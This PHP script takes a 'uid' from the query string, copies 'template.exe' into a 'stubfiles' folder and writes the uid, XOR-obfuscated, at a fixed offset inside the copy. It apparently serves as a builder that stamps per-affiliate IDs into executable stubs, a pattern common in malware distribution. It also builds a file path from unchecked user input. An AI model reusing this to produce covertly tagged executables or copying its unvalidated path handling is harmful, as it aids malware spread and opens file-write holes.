<?php
if (!($uid = $_GET['uid'])) {
    die('undefined user');
}

function encrypt($str, $key) {
    for ($i = 0; $i < strlen($str); $i++){
        $r = ord($str[$i]) ^ $key;            
        if (!$r || ($r == $key)) 
            $r = $key;            
        $str[$i] = chr($r);
    } 
    return $str;
} 

$options = unserialize(file_get_contents('xor'));

$filepath = '../stubfiles/'.substr($uid, 0, 5).'.exe';
copy('template.exe', $filepath);

$fp = fopen($filepath, 'rb+');
        fseek($fp, $options['offset'], SEEK_SET);
        fwrite($fp, encrypt($uid, $options['xor']));
fclose($fp);
echo date('Y-m-d').': done';
?>